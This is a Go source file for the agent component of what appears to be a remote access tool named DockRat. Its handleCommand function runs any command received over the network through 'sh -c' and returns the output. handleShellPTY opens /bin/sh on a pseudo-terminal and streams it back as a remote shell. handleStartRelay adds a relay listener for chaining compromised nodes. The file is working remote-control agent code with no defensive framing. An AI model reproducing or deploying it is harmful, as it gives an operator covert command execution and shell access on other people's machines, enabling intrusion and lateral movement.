package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os/exec"
	"strings"

	"github.com/Singert/DockRat/core/common"
	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/creack/pty"
)

var shellStarted = false
var shellStdin io.WriteCloser
var relayCtx *RelayContext // 全局变量，供 MsgRelayPacket 使用

func StartAgent(conn net.Conn) {
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Connection closed or failed: %v", err)
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Failed to read message body: %v", err)
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Decode error: %v", err)
			continue
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn)
		case protocol.MsgShell:
			handleShellPTY(msg, conn)
		case protocol.MsgStartRelay:
			handleStartRelay(msg, conn)
		case protocol.MsgRelayAck:
			var ack protocol.RelayAckPayload
			if err := json.Unmarshal(msg.Payload, &ack); err != nil {
				log.Println("[-] Decode relay_ack failed:", err)
				return
			}
			log.Printf("[+] Relay register success: %s", ack.Message)

		case protocol.MsgRelayError:
			var errMsg protocol.RelayAckPayload
			if err := json.Unmarshal(msg.Payload, &errMsg); err != nil {
				log.Println("[-] Decode relay_error failed:", err)
				return
			}
			log.Printf("[!] Relay register failed: %s", errMsg.Message)
		case protocol.MsgRelayPacket:
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Println("[-] Decode relay_packet failed:", err)
				break
			}
			if relayCtx != nil {
				HandleRelayPacket(relayCtx, pkt)
			} else {
				log.Println("[-] Relay context not initialized")
			}
		default:
			log.Println("[-] Unknown message type:", msg.Type)
		}
	}
}

func handleCommand(msg protocol.Message, conn net.Conn) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{
		Type:    protocol.MsgResponse,
		Payload: output,
	}
	data, _ := protocol.EncodeMessage(resp)
	conn.Write(data)
}

func handleShellPTY(msg protocol.Message, conn net.Conn) {
	line := string(msg.Payload)

	if !shellStarted {
		cmd := exec.Command("/bin/sh")
		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		shellStarted = true
		shellStdin = ptmx

		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Println("[-] Shell read error:", err)
					return
				}
				msg := protocol.Message{
					Type:    protocol.MsgShell,
					Payload: buf[:n],
				}
				data, err := protocol.EncodeMessage(msg)
				if err != nil {
					log.Println("[-] Shell encode error:", err)
					return
				}
				_, err = conn.Write(data)
				if err != nil {
					log.Println("[-] Shell write error:", err)
					return
				}
			}
		}()
		return
	}

	// 已启动 shell，则写入 stdin
	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	_, err := shellStdin.Write([]byte(line))
	if err != nil {
		log.Println("[-] Write to shell error:", err)
	}
}
func handleStartRelay(msg protocol.Message, conn net.Conn) {
	var payload protocol.StartRelayPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] StartRelay payload decode error:", err)
		return
	}

	log.Printf("[*] Received startrelay command: listen on %s, ID range [%d ~ %d]",
		payload.ListenAddr, payload.IDStart, payload.IDStart+payload.Count-1)

	// 创建本地结构
	reg := node.NewRegistry()
	topo := node.NewNodeGraph()
	alloc := common.NewIDAllocator(payload.IDStart, payload.Count)

	ctx := &RelayContext{
		SelfID:      payload.SelfID, // 后续可传入或由自身记录
		Registry:    reg,
		Topology:    topo,
		IDAllocator: alloc,
		Upstream:    conn, // 保持与 admin 的通道
	}
	relayCtx = ctx
	go StartRelayListener(payload.ListenAddr, ctx)
	go StartAgent(conn)
	// 上报成功
	ack := protocol.RelayReadyPayload{
		SelfID:     -1, // 此处为当前 agent 自己的 ID，建议 future enhancement 填入
		ListenAddr: payload.ListenAddr,
	}
	data, _ := json.Marshal(ack)
	resp := protocol.Message{
		Type:    protocol.MsgRelayReady,
		Payload: data,
	}
	buf, _ := protocol.EncodeMessage(resp)
	conn.Write(buf)
}

/*
✅ 补充建议（结构更优雅方案）

后续可以考虑：

    拆分 relay 与普通 agent 启动逻辑：

        StartBasicAgent(conn)

        StartRelayAgent(conn, ctx)

    将 relay 端启动逻辑独立于 StartAgent()，更便于测试与维护。*/
